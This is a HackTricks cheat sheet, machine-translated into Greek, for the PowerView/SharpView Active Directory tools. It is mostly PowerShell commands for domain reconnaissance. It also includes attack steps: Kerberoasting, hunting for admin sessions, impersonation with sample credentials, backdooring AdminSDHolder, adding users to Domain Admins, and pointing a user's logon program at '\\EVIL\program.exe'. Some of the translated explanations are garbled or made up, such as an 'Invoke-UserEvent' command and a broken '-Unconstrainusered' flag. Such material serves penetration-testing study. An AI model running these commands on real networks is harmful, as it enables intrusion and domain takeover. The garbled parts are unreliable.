# PowerView/SharpView

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε** στην [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

Η πιο ενημερωμένη έκδοση του PowerView θα βρίσκεται πάντα στο κλαδί dev του PowerSploit: [https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

[**SharpView**](https://github.com/tevora-threat/SharpView) είναι μια μεταφορά του [**PowerView**](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) στο .NET

### Γρήγορη απαρίθμηση
```powershell
Get-NetDomain #Basic domain info
#User info
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount #Basic user enabled info
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN #Kerberoastable users
#Groups info
Get-NetGroup | select samaccountname, admincount, description
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=EGOTISTICAL-BANK,DC=local' | %{ $_.SecurityIdentifier } | Convert-SidToName #Get AdminSDHolders
#Computers
Get-NetComputer | select samaccountname, operatingsystem
Get-NetComputer -Unconstrainusered | select samaccountname #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth | select samaccountname #Find computers with Constrained Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups
#Shares
Find-DomainShare -CheckShareAccess #Search readable shares
#Domain trusts
Get-NetDomainTrust #Get all domain trusts (parent, children and external)
Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found
#LHF
#Check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
#Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
Find-LocalAdminAccess
#Get members from Domain Admins (default) and a list of computers and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host. If -Checkaccess, then it also check for LocalAdmin access in the hosts.
Invoke-UserHunter -CheckAccess
#Find interesting ACLs
Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | fl
```
### Πληροφορίες του τομέα

```plaintext
Function Get-Domain
{
    [CmdletBinding()]
    param (
        [Parameter(Position=0, Mandatory=$false)]
        [Alias("Identity")]
        [String]$Domain = $env:USERDOMAIN
    )
    $Domain = $Domain.ToUpper()
    $DomainObj = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("Domain", $Domain)
    $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainObj)
    $Domain
}
```

Η συνάρτηση `Get-Domain` επιστρέφει πληροφορίες για τον τομέα. Παίρνει ένα προαιρετικό όρισμα `Domain`, το οποίο είναι το όνομα του τομέα που θέλουμε να ανακτήσουμε πληροφορίες. Αν δεν δοθεί κάποιο όρισμα, χρησιμοποιείται το όνομα του τομέα του χρήστη που εκτελεί το σενάριο.

Η συνάρτηση αρχικά μετατρέπει το όνομα του τομέα σε κεφαλαία γράμματα. Στη συνέχεια, δημιουργεί ένα αντικείμενο `DomainObj` τύπου `System.DirectoryServices.ActiveDirectory.DirectoryContext`, το οποίο παίρνει ως παραμέτρους τον τύπο "Domain" και το όνομα του τομέα. Έπειτα, χρησιμοποιεί τη μέθοδο `GetDomain` της κλάσης `System.DirectoryServices.ActiveDirectory.Domain` για να ανακτήσει τις πληροφορίες του τομέα και τις επιστρέφει.
```powershell
# Domain Info
Get-Domain #Get info about the current domain
Get-NetDomain #Get info about the current domain
Get-NetDomain -Domain mydomain.local
Get-DomainSID #Get domain SID

# Policy
Get-DomainPolicy #Get info about the policy
(Get-DomainPolicy)."KerberosPolicy" #Kerberos tickets info(MaxServiceAge)
(Get-DomainPolicy)."SystemAccess" #Password policy
Get-DomainPolicyData | select -ExpandProperty SystemAccess #Same as previous
(Get-DomainPolicy).PrivilegeRights #Check your privileges
Get-DomainPolicyData # Same as Get-DomainPolicy

# Domain Controller
Get-DomainController | select Forest, Domain, IPAddress, Name, OSVersion | fl # Get specific info of current domain controller
Get-NetDomainController -Domain mydomain.local #Get all ifo of specific domain Domain Controller

# Get Forest info
Get-ForestDomain
```
### Χρήστες, Ομάδες, Υπολογιστές και Οργανωτικές Μονάδες (OUs)

PowerView παρέχει πολλές εντολές για την ανάκτηση πληροφοριών σχετικά με τους χρήστες, τις ομάδες, τους υπολογιστές και τις οργανωτικές μονάδες (OUs) σε ένα περιβάλλον Windows.

#### Εντολές για τους χρήστες:

- `Get-NetUser`: Επιστρέφει πληροφορίες για τους χρήστες στο τρέχον περιβάλλον.
- `Get-NetUser -Username <username>`: Επιστρέφει πληροφορίες για έναν συγκεκριμένο χρήστη με βάση το όνομα χρήστη.
- `Get-NetUser -GroupName <groupname>`: Επιστρέφει πληροφορίες για τους χρήστες που ανήκουν σε μια συγκεκριμένη ομάδα.

#### Εντολές για τις ομάδες:

- `Get-NetGroup`: Επιστρέφει πληροφορίες για τις ομάδες στο τρέχον περιβάλλον.
- `Get-NetGroup -GroupName <groupname>`: Επιστρέφει πληροφορίες για μια συγκεκριμένη ομάδα με βάση το όνομα της ομάδας.
- `Get-NetGroupMember -GroupName <groupname>`: Επιστρέφει τα μέλη μιας συγκεκριμένης ομάδας.

#### Εντολές για τους υπολογιστές:

- `Get-NetComputer`: Επιστρέφει πληροφορίες για τους υπολογιστές στο τρέχον περιβάλλον.
- `Get-NetComputer -ComputerName <computername>`: Επιστρέφει πληροφορίες για έναν συγκεκριμένο υπολογιστή με βάση το όνομα του υπολογιστή.

#### Εντολές για τις οργανωτικές μονάδες (OUs):

- `Get-NetOU`: Επιστρέφει πληροφορίες για τις οργανωτικές μονάδες (OUs) στο τρέχον περιβάλλον.
- `Get-NetOU -OUName <ouname>`: Επιστρέφει πληροφορίες για μια συγκεκριμένη οργανωτική μονάδα (OU) με βάση το όνομα της οργανωτικής μονάδας.
```powershell
# Users
## Get usernames and their groups
Get-DomainUser -Properties name, MemberOf | fl
## Get-DomainUser and Get-NetUser are kind of the same
Get-NetUser #Get users with several (not all) properties
Get-NetUser | select samaccountname, description, pwdlastset, logoncount, badpwdcount #List all usernames
Get-NetUser -UserName student107 #Get info about a user
Get-NetUser -properties name, description #Get all descriptions
Get-NetUser -properties name, pwdlastset, logoncount, badpwdcount  #Get all pwdlastset, logoncount and badpwdcount
Find-UserField -SearchField Description -SearchTerm "built" #Search account with "something" in a parameter
# Get users with reversible encryption (PWD in clear text with dcsync)
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

# Users Filters
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -properties distinguishedname #All enabled users
Get-NetUser -UACFilter ACCOUNTDISABLE #All disabled users
Get-NetUser -UACFilter SMARTCARD_REQUIRED #Users that require a smart card
Get-NetUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname #Not smart card users
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN | select serviceprincipalname #Kerberoastable users
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} #Domain admins kerberostable
Get-Netuser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto #Constrained Resource Delegation
Get-NetUser -AllowDelegation -AdminCount #All privileged users that aren't marked as sensitive/not for delegation
# retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
Get-ObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {
($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
}
# Users with PASSWD_NOTREQD set in the userAccountControl means that the user is not subject to the current password policy
## Users with this flag might have empty passwords (if allowed) or shorter passwords
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

#Groups
Get-DomainGroup | where Name -like "*Admin*" | select SamAccountName
## Get-DomainGroup is similar to Get-NetGroup
Get-NetGroup #Get groups
Get-NetGroup -Domain mydomain.local #Get groups of an specific domain
Get-NetGroup 'Domain Admins' #Get all data of a group
Get-NetGroup -AdminCount | select name,memberof,admincount,member | fl #Search admin grups
Get-NetGroup -UserName "myusername" #Get groups of a user
Get-NetGroupMember -Identity "Administrators" -Recurse #Get users inside "Administrators" group. If there are groups inside of this grup, the -Recurse option will print the users inside the others groups also
Get-NetGroupMember -Identity "Enterprise Admins" -Domain mydomain.local #Remember that "Enterprise Admins" group only exists in the rootdomain of the forest
Get-NetLocalGroup -ComputerName dc.mydomain.local -ListGroups #Get Local groups of a machine (you need admin rights in no DC hosts)
Get-NetLocalGroupMember -computername dcorp-dc.dollarcorp.moneycorp.local #Get users of localgroups in computer
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs #Check AdminSDHolder users
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} #Get ObjectACLs by sid
Get-NetGPOGroup #Get restricted groups

# Computers
Get-DomainComputer -Properties DnsHostName # Get all domain maes of computers
## Get-DomainComputer is kind of the same as Get-NetComputer
Get-NetComputer #Get all computer objects
Get-NetComputer -Ping #Send a ping to check if the computers are working
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth #Find computers with Constrined Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups

#OU
Get-DomainOU -Properties Name | sort -Property Name #Get names of OUs
Get-DomainOU "Servers" | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties Name} #Get all computers inside an OU (Servers in this case)
## Get-DomainOU is kind of the same as Get-NetOU
Get-NetOU #Get Organization Units
Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_} #Get all computers inside an OU (StudentMachines in this case)
```
### Σύνδεση και Συνεδρίες

Οι επιθέσεις που σχετίζονται με την σύνδεση και τις συνεδρίες αποτελούν σημαντικό κομμάτι της χάκερ τεχνικής. Μέσω αυτών των επιθέσεων, ο χάκερ μπορεί να αποκτήσει πρόσβαση σε συστήματα και να εκτελέσει επιθέσεις μεγαλύτερης κλίμακας.

#### Εντολές PowerShell για την Σύνδεση και τις Συνεδρίες

Ο PowerView παρέχει μια σειρά από εντολές PowerShell που μπορούν να χρησιμοποιηθούν για την εξερεύνηση και την εκμετάλλευση των συνεδριών σε ένα σύστημα. Οι πιο σημαντικές εντολές περιλαμβάνουν:

- `Get-NetSession`: Επιστρέφει πληροφορίες σχετικά με τις ενεργές συνεδρίες στο σύστημα.
- `Get-NetLoggedon`: Επιστρέφει πληροφορίες σχετικά με τους χρήστες που έχουν συνδεθεί στο σύστημα.
- `Invoke-UserImpersonation`: Εκτελεί μια επίθεση εξομοίωσης χρήστη, επιτρέποντας στον χάκερ να αποκτήσει τα δικαιώματα του συγκεκριμένου χρήστη.
- `Invoke-UserEvent`: Εκτελεί μια επίθεση εκδήλωσης χρήστη, προκαλώντας την εκτέλεση ενός συγκεκριμένου γεγονότος από τον χρήστη.

Αυτές οι εντολές μπορούν να χρησιμοποιηθούν για να ανακτήσετε πληροφορίες σχετικά με τις συνεδρίες και τους συνδεδεμένους χρήστες σε ένα σύστημα, καθώς και για να εκτελέσετε επιθέσεις που εκμεταλλεύονται αυτές τις συνεδρίες.
```powershell
Get-NetLoggedon -ComputerName <servername> #Get net logon users at the moment in a computer (need admins rights on target)
Get-NetSession -ComputerName <servername> #Get active sessions on the host
Get-LoggedOnLocal -ComputerName <servername> #Get locally logon users at the moment (need remote registry (default in server OS))
Get-LastLoggedon -ComputerName <servername> #Get last user logged on (needs admin rigths in host)
Get-NetRDPSession -ComputerName <servername> #List RDP sessions inside a host (needs admin rights in host)
```
### Αντικείμενο Ομάδας Πολιτικής Ομάδας - GPOs

Εάν ένας επιτιθέμενος έχει **υψηλά προνόμια σε ένα GPO**, μπορεί να εκμεταλλευτεί αυτό για να **αναβαθμίσει τα προνόμιά του** καταχρώντας το προσθέτοντας δικαιώματα σε έναν χρήστη, προσθέτοντας έναν τοπικό διαχειριστή χρήστη σε έναν υπολογιστή ή δημιουργώντας μια προγραμματισμένη εργασία (άμεση) για να εκτελέσει μια ενέργεια.\
Για [**περισσότερες πληροφορίες σχετικά με αυτό και πώς να το εκμεταλλευτείτε ακολουθήστε αυτόν τον σύνδεσμο**](../active-directory-methodology/acl-persistence-abuse/#gpo-delegation).
```powershell
#GPO
Get-DomainGPO | select displayName #Check the names for info
Get-NetGPO #Get all policies with details
Get-NetGPO | select displayname #Get the names of the policies
Get-NetGPO -ComputerName <servername> #Get the policy applied in a computer
gpresult /V #Get current policy

# Get who can create new GPOs
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=dev,DC=invented,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

# Enumerate permissions for GPOs where users with RIDs of > 1000 have some kind of modification/control rights
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')} | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

# Get permissions a user/group has over any GPO
$sid=Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

# COnvert GPO GUID to name
Get-GPO -Guid 18E5A689-E67F-90B2-1953-198ED4A7F532

# Transform SID to name
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1126

# Get GPO of an OU
Get-NetGPO -GPOName '{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}'

# Returns all GPOs that modify local group memberships through Restricted Groups or Group Policy Preferences.
Get-DomainGPOLocalGroup | select GPODisplayName, GroupName, GPOType

# Enumerates the machines where a specific domain user/group is a member of a specific local group.
Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName
```
Μάθετε πώς να **εκμεταλλευτείτε τα δικαιώματα πάνω σε GPOs και ACLs** στο:

{% content-ref url="../active-directory-methodology/acl-persistence-abuse/" %}
[acl-persistence-abuse](../active-directory-methodology/acl-persistence-abuse/)
{% endcontent-ref %}

### ACL
```powershell
#Get ACLs of an object (permissions of other objects over the indicated one)
Get-ObjectAcl -SamAccountName <username> -ResolveGUIDs

#Other way to get ACLs of an object
$sid = Convert-NameToSid <username/group>
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

#Get permissions of a file
Get-PathAcl -Path "\\dc.mydomain.local\sysvol"

#Find intresting ACEs (Interesting permisions of "unexpected objects" (RID>1000 and modify permissions) over other objects
Find-InterestingDomainAcl -ResolveGUIDs

#Check if any of the interesting permissions founds is realated to a username/group
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"}

#Get special rights over All administrators in domain
Get-NetGroupMember -GroupName "Administrators" -Recurse | ?{$_.IsGroup -match "false"} | %{Get-ObjectACL -SamAccountName $_.MemberName -ResolveGUIDs} | select ObjectDN, IdentityReference, ActiveDirectoryRights
```
### Κοινόχρηστα αρχεία και φάκελοι

PowerView provides several functions to enumerate shared files and folders on a target system. These functions can be useful for gathering information about the file sharing configuration and identifying potential vulnerabilities.

#### Get-NetShare

The `Get-NetShare` function retrieves information about shared folders on the target system. It returns the share name, local path, and description for each shared folder.

```powershell
Get-NetShare
```

#### Get-NetLoggedon

The `Get-NetLoggedon` function enumerates users who are currently logged on to the target system and have open files or sessions. This can be useful for identifying active users and potential targets for lateral movement.

```powershell
Get-NetLoggedon
```

#### Get-NetSession

The `Get-NetSession` function retrieves information about active sessions on the target system. It returns details such as the username, computer name, session ID, and the time the session was established.

```powershell
Get-NetSession
```

#### Get-NetFile

The `Get-NetFile` function enumerates files that are open remotely on the target system. It returns information about the open files, including the file ID, path, username, and the time the file was opened.

```powershell
Get-NetFile
```

#### Get-NetFileServer

The `Get-NetFileServer` function retrieves information about file servers on the target system. It returns details such as the server name, number of open files, and the number of sessions established with the server.

```powershell
Get-NetFileServer
```

By using these functions, you can gain valuable insights into the shared files and folders on a target system, which can help in identifying potential security weaknesses and planning further exploitation.
```powershell
Get-NetFileServer #Search file servers. Lot of users use to be logged in this kind of servers
Find-DomainShare -CheckShareAccess #Search readable shares
Find-InterestingDomainShareFile #Find interesting files, can use filters
```
### Εμπιστοσύνη του τομέα

Η εμπιστοσύνη του τομέα αναφέρεται στη σχέση εμπιστοσύνης μεταξύ δύο τομέων σε ένα περιβάλλον Active Directory. Όταν δύο τομείς έχουν εμπιστοσύνη μεταξύ τους, οι χρήστες και οι πόροι ενός τομέα μπορούν να αναγνωρίζονται και να αποκτούν πρόσβαση σε πόρους στον άλλο τομέα. Αυτό μπορεί να είναι χρήσιμο για την κοινή χρήση πόρων, όπως αρχεία και εκτυπωτές, μεταξύ διαφορετικών τομέων. Οι εμπιστοσύνες του τομέα μπορούν να είναι μονόδρομες ή αμφίδρομες, ανάλογα με τον τρόπο που έχουν διαμορφωθεί.
```powershell
Get-NetDomainTrust #Get all domain trusts (parent, children and external)
Get-DomainTrust #Same
Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found
Get-DomainTrustMapping #Enumerate also all the trusts

Get-ForestDomain # Get basic forest info
Get-ForestGlobalCatalog #Get info of current forest (no external)
Get-ForestGlobalCatalog -Forest external.domain #Get info about the external forest (if possible)
Get-DomainTrust -SearchBase "GC://$($ENV:USERDNSDOMAIN)"

Get-NetForestTrust #Get forest trusts (it must be between 2 roots, trust between a child and a root is just an external trust)

Get-DomainForeingUser #Get users with privileges in other domains inside the forest
Get-DomainForeignGroupMember #Get groups with privileges in other domains inside the forest
```
### Εύκολος στόχος

Οι εύκολοι στόχοι
```powershell
#Check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl

#Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
Find-LocalAdminAccess

#(This time you need to give the list of computers in the domain) Do the same as before but trying to execute a WMI action in each computer (admin privs are needed to do so). Useful if RCP and SMB ports are closed.
.\Find-WMILocalAdminAccess.ps1 -ComputerFile .\computers.txt

#Enumerate machines where a particular user/group identity has local admin rights
Get-DomainGPOUserLocalGroupMapping -Identity <User/Group>

# Enumerates the members of specified local group (default administrators)
# for all the targeted machines on the current (or specified) domain.
Invoke-EnumerateLocalAdmin
Find-DomainLocalGroupMember

#Search unconstrained delegation computers and show users
Find-DomainUserLocation -ComputerUnconstrained -ShowAll

#Admin users that allow delegation, logged into servers that allow unconstrained delegation
Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation

#Get members from Domain Admins (default) and a list of computers
# and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host.
# If -Checkaccess, then it also check for LocalAdmin access in the hosts.
## By default users inside Domain Admins are searched
Find-DomainUserLocation [-CheckAccess] | select UserName, SessionFromName
Invoke-UserHunter [-CheckAccess]

#Search "RDPUsers" users
Invoke-UserHunter -GroupName "RDPUsers"

#It will only search for active users inside high traffic servers (DC, File Servers and Distributed File servers)
Invoke-UserHunter -Stealth
```
### Διαγραμμένα αντικείμενα

Το PowerView παρέχει τη δυνατότητα να ανακτήσετε πληροφορίες για διαγραμμένα αντικείμενα σε έναν Active Directory. Αυτό μπορεί να είναι χρήσιμο για την εξαγωγή πληροφοριών για χρήστες, ομάδες ή υπολογιστές που έχουν διαγραφεί από τον Active Directory, αλλά εξακολουθούν να υπάρχουν στη βάση δεδομένων.

Για να ανακτήσετε πληροφορίες για διαγραμμένα αντικείμενα, μπορείτε να χρησιμοποιήσετε την εντολή `Get-DomainObject` με την παράμετρο `-Deleted`. Αυτό θα επιστρέψει όλα τα διαγραμμένα αντικείμενα στον Active Directory.

```powershell
Get-DomainObject -Deleted
```

Μπορείτε επίσης να περιορίσετε τα αποτελέσματα σε συγκεκριμένους τύπους αντικειμένων, χρησιμοποιώντας την παράμετρο `-ObjectType`. Για παράδειγμα, μπορείτε να ανακτήσετε μόνο τα διαγραμμένα χρήστες με την εξής εντολή:

```powershell
Get-DomainObject -Deleted -ObjectType User
```

Αυτό θα επιστρέψει μόνο τα διαγραμμένα αντικείμενα τύπου χρήστη. Μπορείτε να αντικαταστήσετε το `User` με άλλους τύπους αντικειμένων, όπως `Group` ή `Computer`, για να ανακτήσετε μόνο τα διαγραμμένα αντικείμενα αυτών των τύπων.
```powershell
#This isn't a powerview command, it's a feature from the AD management powershell module of Microsoft
#You need to be in the AD Recycle Bin group of the AD to list the deleted AD objects
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### MISC

#### Μετατροπή SID σε Όνομα

```powershell
ConvertFrom-SID -SID <SID>
```

Αυτή η εντολή μετατρέπει ένα SID (Αναγνωριστικό Ασφαλείας) σε αντίστοιχο όνομα χρήστη ή ομάδας. Απλά αντικαταστήστε το `<SID>` με το πραγματικό SID που θέλετε να μετατρέψετε.
```powershell
"S-1-5-21-1874506631-3219952063-538504511-2136" | Convert-SidToName
```
Ο Kerberoast είναι μια τεχνική επίθεσης που στοχεύει στην απόκτηση κρυπτογραφημένων κλειδιών του Kerberos για εξαγωγή κωδικών πρόσβασης. Αυτή η επίθεση εκμεταλλεύεται την αδυναμία του Kerberos να αντισταθεί σε επιθέσεις brute-force. Οι επιτιθέμενοι μπορούν να χρησιμοποιήσουν το PowerView για να εκτελέσουν την επίθεση Kerberoast και να αποκτήσουν τα κρυπτογραφημένα κλειδιά του Kerberos. Αυτά τα κλειδιά μπορούν στη συνέχεια να αποκρυπτογραφηθούν για να αποκτηθούν οι κωδικοί πρόσβασης των χρηστών.
```powershell
Invoke-Kerberoast [-Identity websvc] #Without "-Identity" kerberoast all possible users
```
#### Χρήση διαφορετικών διαπιστευτηρίων (όρισμα)

Μπορείτε να χρησιμοποιήσετε διαφορετικά διαπιστευτήρια παρέχοντας το αντίστοιχο όρισμα.
```powershell
# use an alterate creadential for any function
$SecPassword = ConvertTo-SecureString 'BurgerBurgerBurger!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainUser -Credential $Cred
```
#### Προσομοίωση ενός χρήστη

To impersonate a user in PowerShell, you can use the `Invoke-UserImpersonation` function from the PowerView module. This allows you to execute commands as if you were that user.

```powershell
Invoke-UserImpersonation -Username <username>
```

Replace `<username>` with the username of the user you want to impersonate. This will create a new PowerShell session with the user's credentials, allowing you to perform actions on their behalf.

Keep in mind that you need administrative privileges to impersonate other users. Additionally, this technique may raise suspicion and leave traces in the system's event logs, so use it responsibly and with proper authorization.
```powershell
# if running in -sta mode, impersonate another credential a la "runas /netonly"
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Invoke-UserImpersonation -Credential $Cred
# ... action
Invoke-RevertToSelf
```
#### Ορισμός τιμών

```powershell
$variable = value
```

Χρησιμοποιήστε την παραπάνω εντολή για να ορίσετε μια τιμή σε μια μεταβλητή στο PowerShell. Αντικαταστήστε το `variable` με το όνομα της μεταβλητής που θέλετε να ορίσετε και το `value` με την τιμή που θέλετε να ανατεθεί στη μεταβλητή.
```powershell
# set the specified property for the given user identity
Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose
# Set the owner of 'dfm' in the current domain to 'harmj0y'
Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y
# Backdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
# Add user to 'Domain Admins'
Add-NetGroupUser -Username username -GroupName 'Domain Admins' -Domain my.domain.local
```
<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Συμμετάσχετε** στην [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
